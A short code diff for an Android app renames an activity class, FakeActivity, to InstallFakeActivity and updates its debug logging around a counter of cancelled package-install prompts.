@@ -5,8 +5,6 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.view.Window;
-import android.view.WindowManager;
-import android.widget.Toast;
 import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
@@ -19,7 +17,7 @@ import java.io.File;
  * Time: PM4:42
  * To change this template use File | Settings | File Templates.
  */
-public class FakeActivity extends Activity {
+public class InstallFakeActivity extends Activity {
 
     public static final String KEY_PATH = "key_path";
 
@@ -54,8 +52,8 @@ public class FakeActivity extends Activity {
                 AppRuntime.CANCEL_COUNT++;
 
                 if (Config.DEBUG) {
-                    Config.LOGD("[[FakeActivity::onActivityResult]] Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT);
-//                        Toast.makeText(FakeActivity.this, "Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT, Toast.LENGTH_SHORT).show();
+                    Config.LOGD("[[InstallFakeActivity::onActivityResult]] Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT);
+//                        Toast.makeText(InstallFakeActivity.this, "Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT, Toast.LENGTH_SHORT).show();
                 }
                 AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);
                 SettingManager.getInstance().setCancelInstallReserve(true);
